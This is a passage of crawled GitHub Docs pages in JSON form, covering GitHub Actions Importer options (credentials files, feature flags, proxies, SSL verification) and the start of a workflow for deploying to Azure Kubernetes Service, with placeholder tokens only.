    "canonicalUrl": "https://docs.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/supplemental-arguments-and-settings",
    "title": "Supplemental arguments and settings - GitHub Docs",
    "description": "GitHub Actions Importer has several supplemental arguments and settings to tailor the migration process to your needs.",
    "author": null,
    "keywords": "Migration,CI,CD",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Supplemental arguments and settings - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/supplemental-arguments-and-settings"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/supplemental-arguments-and-settings"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "6FFA:68D95:1EA06:266EC:681C51E8",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:40:40 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21945-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686440.116137, VS0, VE239",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "28928",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Supplemental arguments and settings - GitHub Docs\nGitHub Actions Importer has several supplemental arguments and settings to tailor the migration process to your needs.\nLegal notice\nThis article provides general information for configuring GitHub Actions Importer's supplemental arguments and settings, such as optional parameters, path arguments, and network settings.\nOptional parameters\nGitHub Actions Importer has several optional parameters that you can use to customize the migration process.\nLimiting allowed actions\nThe following options can be used to limit which actions are allowed in converted workflows. When used in combination, these options expand the list of allowed actions. If none of these options are supplied, then all actions are allowed.\n--allowed-actions specifies a list of actions to allow in converted workflows. Wildcards are supported. Any other actions other than those provided will be disallowed.\nFor example:\n--allowed-actions actions/checkout@v4 actions/upload-artifact@* my-org/* \nYou can provide an empty list to disallow all actions. For example, --allowed-actions=.\n--allow-verified-actions specifies that all actions from verified creators are allowed.\n--allow-github-created-actions specifies that actions published from the github or actions organizations are allowed.\nFor example, such actions include github/super-linter and actions/checkout.\nThis option is equivalent to --allowed-actions actions/* github/*.\nUsing a credentials file for authentication\nThe --credentials-file parameter specifies the path to a file containing credentials for different servers that GitHub Actions Importer can authenticate to. This is useful when build scripts (such as .travis.yml or jenkinsfile) are stored in multiple GitHub Enterprise Server instances.\nA credentials file must be a YAML file containing a list of server and access token combinations. GitHub Actions Importer uses the credentials for the URL that most closely matches the network request being made.\nFor example:\n- url: https://github.com access_token: ghp_mygeneraltoken - url: https://github.com/specific_org/ access_token: ghp_myorgspecifictoken - url: https://jenkins.org access_token: abc123 username: marty_mcfly \nFor the above credentials file, GitHub Actions Importer uses the access token ghp_mygeneraltoken to authenticate all network requests to https://github.com, unless the network request is for a repository in the specific_org organization. In that case, the ghp_myorgspecifictoken token is used to authenticate instead.\nAlternative source code providers\nGitHub Actions Importer can automatically fetch source code from non-GitHub repositories. A credentials file can specify the provider, the provider URL, and the credentials needed to retrieve the source code.\nFor example:\n- url: https://gitlab.com access_token: super_secret_token provider: gitlab \nFor the above example, GitHub Actions Importer uses the token super_secret_token to retrieve any source code that is hosted on https://gitlab.com.\nSupported values for provider are:\ngithub (default)\ngitlab\nbitbucket_server\nazure_devops\nControlling optional features\nYou can use the --features option to limit the features used in workflows that GitHub Actions Importer creates. This is useful for excluding newer GitHub Actions syntax from workflows when migrating to an older GitHub Enterprise Server instance. When using the --features option, you must specify the version of GitHub Enterprise Server that you are migrating to.\nFor example:\ngh actions-importer dry-run ... --features ghes-3.3 \nThe supported values for --features are:\nall (default value)\nghes-latest\nghes-<number>, where <number> is the version of GitHub Enterprise Server, 3.0 or later. For example, ghes-3.3.\nYou can view the list of available feature flags by GitHub Actions Importer by running the list-features command. For example:\nShell\ngh actions-importer list-features \nYou should see an output similar to the following.\nAvailable feature flags: actions/cache (disabled): Control usage of actions/cache inside of workflows. Outputs a comment if not enabled. GitHub Enterprise Server >= ghes-3.5 required. composite-actions (enabled): Minimizes resulting workflow complexity through the use of composite actions. See https://docs.github.com/en/actions/creating-actions/creating-a-composite-action for more information. GitHub Enterprise Server >= ghes-3.4 required. reusable-workflows (disabled): Avoid duplication by re-using existing workflows. See https://docs.github.com/en/actions/using-workflows/reusing-workflows for more information. GitHub Enterprise Server >= ghes-3.4 required. workflow-concurrency-option-allowed (enabled): Allows the use of the `concurrency` option in workflows. See https://docs.github.com/en/actions/reference/workflow-syntax-for-github-actions#concurrency for more information. GitHub Enterprise Server >= ghes-3.2 required. Enable features by passing --enable-features feature-1 feature-2 Disable features by passing --disable-features feature-1 feature-2 \nTo toggle feature flags, you can use either of the following methods:\nUse the --enable-features and --disable-features options when running a gh actions-importer command.\nUse an environment variable for each feature flag.\nYou can use the --enable-features and --disable-features options to select specific features to enable or disable for the duration of the command. For example, the following command disables use of actions/cache and composite-actions:\ngh actions-importer dry-run ... --disable-features=composite-actions actions/cache \nYou can use the configure --features command to interactively configure feature flags and automatically write them to your environment:\n$ gh actions-importer configure --features ✔ Which features would you like to configure?: actions/cache, reusable-workflows ✔ actions/cache (disabled): Enable ? reusable-workflows (disabled): › Enable Disable \nDisabling network response caching\nBy default, GitHub Actions Importer caches responses from network requests to reduce network load and reduce run time. You can use the --no-http-cache option to disable the network cache. For example:\ngh actions-importer forecast ... --no-http-cache \nPath arguments\nWhen running GitHub Actions Importer, path arguments are relative to the container's disk, so absolute paths relative to the container's host machine are not supported. When GitHub Actions Importer is run, the container's /data directory is mounted to the directory where GitHub Actions Importer is run.\nFor example, the following command, when used in the /Users/mona directory, outputs the GitHub Actions Importer audit summary to the /Users/mona/out directory:\ngh actions-importer audit --output-dir /data/out \nUsing a proxy\nTo access servers that are configured with a HTTP proxy, you must set the following environment variables with the proxy's URL:\nOCTOKIT_PROXY: for any GitHub server.\nHTTP_PROXY (or HTTPS_PROXY): for any other servers.\nFor example:\nexport OCTOKIT_PROXY=https://proxy.example.com:8443 export HTTPS_PROXY=$OCTOKIT_PROXY \nIf the proxy requires authentication, a username and password must be included in the proxy URL. For example, https://username:password@proxy.url:port.\nDisabling SSL certificate verification\nBy default, GitHub Actions Importer verifies SSL certificates when making network requests. You can disable SSL certificate verification with the --no-ssl-verify option. For example:\ngh actions-importer audit --output-dir ./output --no-ssl-verify \nLegal notice\nPortions have been adapted from https://github.com/github/gh-actions-importer/ under the MIT license:\nMIT License Copyright (c) 2022 GitHub Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-using-github-actions-importer-to-automate-migrations-supplemental-arguments-and-setting-8qhvf.html",
  "markdown": "# Supplemental arguments and settings - GitHub Docs\n\nGitHub Actions Importer has several supplemental arguments and settings to tailor the migration process to your needs.\n\n[Legal notice](#legal-notice)\n\nThis article provides general information for configuring GitHub Actions Importer's supplemental arguments and settings, such as optional parameters, path arguments, and network settings.\n\n## [Optional parameters](#optional-parameters)\n\nGitHub Actions Importer has several optional parameters that you can use to customize the migration process.\n\n### [Limiting allowed actions](#limiting-allowed-actions)\n\nThe following options can be used to limit which actions are allowed in converted workflows. When used in combination, these options expand the list of allowed actions. If none of these options are supplied, then all actions are allowed.\n\n*   `--allowed-actions` specifies a list of actions to allow in converted workflows. Wildcards are supported. Any other actions other than those provided will be disallowed.\n    \n    For example:\n    \n    ```\n    --allowed-actions actions/checkout@v4 actions/upload-artifact@* my-org/*\n    ```\n    \n    You can provide an empty list to disallow all actions. For example, `--allowed-actions=`.\n    \n*   `--allow-verified-actions` specifies that all actions from verified creators are allowed.\n    \n*   `--allow-github-created-actions` specifies that actions published from the `github` or `actions` organizations are allowed.\n    \n    For example, such actions include `github/super-linter` and `actions/checkout`.\n    \n    This option is equivalent to `--allowed-actions actions/* github/*`.\n    \n\n### [Using a credentials file for authentication](#using-a-credentials-file-for-authentication)\n\nThe `--credentials-file` parameter specifies the path to a file containing credentials for different servers that GitHub Actions Importer can authenticate to. This is useful when build scripts (such as `.travis.yml` or `jenkinsfile`) are stored in multiple GitHub Enterprise Server instances.\n\nA credentials file must be a YAML file containing a list of server and access token combinations. GitHub Actions Importer uses the credentials for the URL that most closely matches the network request being made.\n\nFor example:\n\n```\n- url: https://github.com\n  access_token: ghp_mygeneraltoken\n- url: https://github.com/specific_org/\n  access_token: ghp_myorgspecifictoken\n- url: https://jenkins.org\n  access_token: abc123\n  username: marty_mcfly\n```\n\nFor the above credentials file, GitHub Actions Importer uses the access token `ghp_mygeneraltoken` to authenticate all network requests to `https://github.com`, _unless_ the network request is for a repository in the `specific_org` organization. In that case, the `ghp_myorgspecifictoken` token is used to authenticate instead.\n\n#### [Alternative source code providers](#alternative-source-code-providers)\n\nGitHub Actions Importer can automatically fetch source code from non-GitHub repositories. A credentials file can specify the `provider`, the provider URL, and the credentials needed to retrieve the source code.\n\nFor example:\n\n```\n- url: https://gitlab.com\n  access_token: super_secret_token\n  provider: gitlab\n```\n\nFor the above example, GitHub Actions Importer uses the token `super_secret_token` to retrieve any source code that is hosted on `https://gitlab.com`.\n\nSupported values for `provider` are:\n\n*   `github` (default)\n*   `gitlab`\n*   `bitbucket_server`\n*   `azure_devops`\n\n### [Controlling optional features](#controlling-optional-features)\n\nYou can use the `--features` option to limit the features used in workflows that GitHub Actions Importer creates. This is useful for excluding newer GitHub Actions syntax from workflows when migrating to an older GitHub Enterprise Server instance. When using the `--features` option, you must specify the version of GitHub Enterprise Server that you are migrating to.\n\nFor example:\n\n```\ngh actions-importer dry-run ... --features ghes-3.3\n```\n\nThe supported values for `--features` are:\n\n*   `all` (default value)\n*   `ghes-latest`\n*   `ghes-<number>`, where `<number>` is the version of GitHub Enterprise Server, `3.0` or later. For example, `ghes-3.3`.\n\nYou can view the list of available feature flags by GitHub Actions Importer by running the `list-features` command. For example:\n\nShell\n\n```\ngh actions-importer list-features\n```\n\nYou should see an output similar to the following.\n\n```\nAvailable feature flags:\n\nactions/cache (disabled):\n        Control usage of actions/cache inside of workflows. Outputs a comment if not enabled.\n        GitHub Enterprise Server >= ghes-3.5 required.\n\ncomposite-actions (enabled):\n        Minimizes resulting workflow complexity through the use of composite actions. See https://docs.github.com/en/actions/creating-actions/creating-a-composite-action for more information.\n        GitHub Enterprise Server >= ghes-3.4 required.\n\nreusable-workflows (disabled):\n        Avoid duplication by re-using existing workflows. See https://docs.github.com/en/actions/using-workflows/reusing-workflows for more information.\n        GitHub Enterprise Server >= ghes-3.4 required.\n\nworkflow-concurrency-option-allowed (enabled):\n        Allows the use of the `concurrency` option in workflows. See https://docs.github.com/en/actions/reference/workflow-syntax-for-github-actions#concurrency for more information.\n        GitHub Enterprise Server >= ghes-3.2 required.\n\nEnable features by passing --enable-features feature-1 feature-2\nDisable features by passing --disable-features feature-1 feature-2\n```\n\nTo toggle feature flags, you can use either of the following methods:\n\n*   Use the `--enable-features` and `--disable-features` options when running a `gh actions-importer` command.\n*   Use an environment variable for each feature flag.\n\nYou can use the `--enable-features` and `--disable-features` options to select specific features to enable or disable for the duration of the command. For example, the following command disables use of `actions/cache` and `composite-actions`:\n\n```\ngh actions-importer dry-run ... --disable-features=composite-actions actions/cache\n```\n\nYou can use the `configure --features` command to interactively configure feature flags and automatically write them to your environment:\n\n```\n$ gh actions-importer configure --features\n\n✔ Which features would you like to configure?: actions/cache, reusable-workflows\n✔ actions/cache (disabled): Enable\n? reusable-workflows (disabled):\n› Enable\n  Disable\n```\n\n### [Disabling network response caching](#disabling-network-response-caching)\n\nBy default, GitHub Actions Importer caches responses from network requests to reduce network load and reduce run time. You can use the `--no-http-cache` option to disable the network cache. For example:\n\n```\ngh actions-importer forecast ... --no-http-cache\n```\n\n## [Path arguments](#path-arguments)\n\nWhen running GitHub Actions Importer, path arguments are relative to the container's disk, so absolute paths relative to the container's host machine are not supported. When GitHub Actions Importer is run, the container's `/data` directory is mounted to the directory where GitHub Actions Importer is run.\n\nFor example, the following command, when used in the `/Users/mona` directory, outputs the GitHub Actions Importer audit summary to the `/Users/mona/out` directory:\n\n```\ngh actions-importer audit --output-dir /data/out\n```\n\n## [Using a proxy](#using-a-proxy)\n\nTo access servers that are configured with a HTTP proxy, you must set the following environment variables with the proxy's URL:\n\n*   `OCTOKIT_PROXY`: for any GitHub server.\n*   `HTTP_PROXY` (or `HTTPS_PROXY`): for any other servers.\n\nFor example:\n\n```\nexport OCTOKIT_PROXY=https://proxy.example.com:8443\nexport HTTPS_PROXY=$OCTOKIT_PROXY\n```\n\nIf the proxy requires authentication, a username and password must be included in the proxy URL. For example, `https://username:password@proxy.url:port`.\n\n## [Disabling SSL certificate verification](#disabling-ssl-certificate-verification)\n\nBy default, GitHub Actions Importer verifies SSL certificates when making network requests. You can disable SSL certificate verification with the `--no-ssl-verify` option. For example:\n\n```\ngh actions-importer audit --output-dir ./output --no-ssl-verify\n```\n\n## [Legal notice](#legal-notice)\n\nPortions have been adapted from [https://github.com/github/gh-actions-importer/](https://github.com/github/gh-actions-importer/) under the MIT license:\n\n```\nMIT License\n\nCopyright (c) 2022 GitHub\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n```",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 244,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-using-github-actions-importer-to-automate-migrations-supplemental-arguments-and-setting",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-using-github-actions-importer-to-automate-migrations-supplemental-arguments-and-setting",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-using-github-actions-importer-to-automate-migrations-supplemental-arguments-and-setting",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-using-github-actions-importer-to-automate-migrations-supplemental-arguments-and-setting",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-using-github-actions-importer-to-automate-migrations-supplemental-arguments-and-setting"
    },
    "lengths": {
      "extractus": 13311,
      "readableText": 11860,
      "none": 34568,
      "readableTextIfPossible": 11860,
      "result": 11860,
      "markdown": 9562
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/using-github-hosted-runners/connecting-to-a-private-network",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/using-github-hosted-runners/connecting-to-a-private-network",
    "loadedTime": "2025-05-08T06:40:53.012Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/using-github-hosted-runners/connecting-to-a-private-network",
    "title": "Connecting to a private network with GitHub-hosted runners - GitHub Docs",
    "description": "You can connect GitHub-hosted runners to resources on a private network, including package registries, secret managers, and other on-premises services.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Connecting to a private network with GitHub-hosted runners - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/using-github-hosted-runners/connecting-to-a-private-network"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/using-github-hosted-runners/connecting-to-a-private-network"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "DF92:1F8878:EEEBA0:13801A1:681C51EE",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:40:46 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21945-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686447.633465, VS0, VE225",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "22894",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Connecting to a private network with GitHub-hosted runners\nYou can connect GitHub-hosted runners to resources on a private network, including package registries, secret managers, and other on-premises services.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-using-github-hosted-runners-connecting-to-a-private-network-st76y.html",
  "markdown": "# Connecting to a private network with GitHub-hosted runners\n\nYou can connect GitHub-hosted runners to resources on a private network, including package registries, secret managers, and other on-premises services.",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 228,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-using-github-hosted-runners-connecting-to-a-private-network-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-using-github-hosted-runners-connecting-to-a-private-network-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-using-github-hosted-runners-connecting-to-a-private-network-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-using-github-hosted-runners-connecting-to-a-private-network-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-using-github-hosted-runners-connecting-to-a-private-network-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 1212,
      "readableText": 414,
      "none": 20828,
      "readableTextIfPossible": 20828,
      "result": 414,
      "markdown": 213
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/use-cases-and-examples/deploying/deploying-to-azure-kubernetes-service",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/use-cases-and-examples/deploying/deploying-to-azure-kubernetes-service",
    "loadedTime": "2025-05-08T06:40:56.633Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/use-cases-and-examples/deploying/deploying-to-azure-kubernetes-service",
    "title": "Deploying to Azure Kubernetes Service - GitHub Docs",
    "description": "You can deploy your project to Azure Kubernetes Service (AKS) as part of your continuous deployment (CD) workflows.",
    "author": null,
    "keywords": "CD,Azure Kubernetes Service",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Deploying to Azure Kubernetes Service - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/use-cases-and-examples/deploying/deploying-to-azure-kubernetes-service"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/use-cases-and-examples/deploying/deploying-to-azure-kubernetes-service"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "6498:18ED:4D11A8:6B6E2F:681C51F0",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:40:49 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21945-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686449.942013, VS0, VE378",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "28637",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Deploying to Azure Kubernetes Service\nYou can deploy your project to Azure Kubernetes Service (AKS) as part of your continuous deployment (CD) workflows.\nIntroduction\nThis guide explains how to use GitHub Actions to build and deploy a project to Azure Kubernetes Service.\nNote\nIf your GitHub Actions workflows need to access resources from a cloud provider that supports OpenID Connect (OIDC), you can configure your workflows to authenticate directly to the cloud provider. This will let you stop storing these credentials as long-lived secrets and provide other security benefits. For more information, see About security hardening with OpenID Connect. and Configuring OpenID Connect in Azure.\nPrerequisites\nBefore creating your GitHub Actions workflow, you will first need to complete the following setup steps:\nCreate a target AKS cluster and an Azure Container Registry (ACR). For more information, see Quickstart: Deploy an AKS cluster by using the Azure portal - Azure Kubernetes Service and Quickstart - Create registry in portal - Azure Container Registry in the Azure documentation.\nCreate a secret called AZURE_CREDENTIALS to store your Azure credentials. For more information about how to find this information and structure the secret, see the Azure/login action documentation.\nCreating the workflow\nOnce you've completed the prerequisites, you can proceed with creating the workflow.\nThe following example workflow demonstrates how to build and deploy a project to Azure Kubernetes Service when code is pushed to your repository.\nUnder the workflow env key, change the following values:\nAZURE_CONTAINER_REGISTRY to the name of your container registry\nPROJECT_NAME to the name of your project\nRESOURCE_GROUP to the resource group containing your AKS cluster\nCLUSTER_NAME to the name of your AKS cluster\nThis workflow uses the helm render engine for the azure/k8s-bake action. If you will use the helm render engine, change the value of CHART_PATH to the path to your helm file. Change CHART_OVERRIDE_PATH to an array of override file paths. If you use a different render engine, update the input parameters sent to the azure/k8s-bake action.\nYAML\n# This workflow uses actions that are not certified by GitHub. # They are provided by a third-party and are governed by # separate terms of service, privacy policy, and support # documentation. # GitHub recommends pinning actions to a commit SHA. # To get a newer version, you will need to update the SHA. # You can also reference a tag or branch, but the action may change without warning. name: Build and deploy to Azure Kubernetes Service env: AZURE_CONTAINER_REGISTRY: MY_REGISTRY_NAME # set this to the name of your container registry PROJECT_NAME: MY_PROJECT_NAME # set this to your project's name RESOURCE_GROUP: MY_RESOURCE_GROUP # set this to the resource group containing your AKS cluster CLUSTER_NAME: MY_CLUSTER_NAME # set this to the name of your AKS cluster REGISTRY_URL: MY_REGISTRY_URL # set this to the URL of your registry # If you bake using helm: CHART_PATH: MY_HELM_FILE # set this to the path to your helm file CHART_OVERRIDE_PATH: MY_OVERRIDE_FILES # set this to an array of override file paths on: [push] jobs: build: runs-on: ubuntu-latest steps: - uses: actions/checkout@v4 - name: Azure Login uses: azure/login@14a755a4e2fd6dff25794233def4f2cf3f866955 with: creds: ${{ secrets.AZURE_CREDENTIALS }} - name: Build image on ACR uses: azure/CLI@61bb69d64d613b52663984bf12d6bac8fd7b3cc8 with: azcliversion: 2.29.1 inlineScript: | az configure --defaults acr=${{ env.AZURE_CONTAINER_REGISTRY }} az acr build -t -t ${{ env.REGISTRY_URL }}/${{ env.PROJECT_NAME }}:${{ github.sha }} - name: Gets K8s context uses: azure/aks-set-context@94ccc775c1997a3fcfbfbce3c459fec87e0ab188 with: creds: ${{ secrets.AZURE_CREDENTIALS }} resource-group: ${{ env.RESOURCE_GROUP }} cluster-name: ${{ env.CLUSTER_NAME }} id: login - name: Configure deployment uses: azure/k8s-bake@61041e8c2f75c1f01186c8f05fb8b24e1fc507d8 with: renderEngine: 'helm' helmChart: ${{ env.CHART_PATH }} overrideFiles: ${{ env.CHART_OVERRIDE_PATH }} overrides: | replicas:2 helm-version: 'latest' 